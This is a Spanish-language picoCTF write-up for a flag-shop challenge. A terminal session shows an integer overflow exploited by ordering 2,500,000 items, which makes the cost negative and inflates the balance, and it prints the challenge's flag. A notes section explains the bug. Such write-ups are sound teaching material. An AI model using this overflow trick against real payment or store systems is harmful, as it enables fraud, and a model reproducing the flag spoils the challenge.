## Descripción

There's a flag shop selling stuff, can you buy a flag?

[Source](https://challenge-files.picoctf.net/c_fickle_tempest/3b8dcb92959510cff4c72e182cec42febd0b32bd1911c385e3a4a74a03181e9d/store.c). Connect with nc fickle-tempest.picoctf.net 60218.
## Solución

**Solución 1
```
usuarionazz890@DESKTOP-EHL2SJN:~$ nc fickle-tempest.picoctf.net 60218
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2500000

The final cost is: -2044967296

Your current balance after transaction: 2044968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_F2Eb382F}


 picoCTF{m0n3y_bag5_F2Eb382F}

```

#### NOTAS
Abuso de desbordamiento de enteros (Integer Overflow). Comprar una cantidad masiva de objetos (`2500000`) causa que el `total_cost` supere el límite de 32-bits y se vuelva negativo. Al restar un costo negativo al balance, el balance aumenta drásticamente, permitiendo comprar la flag real de 100k.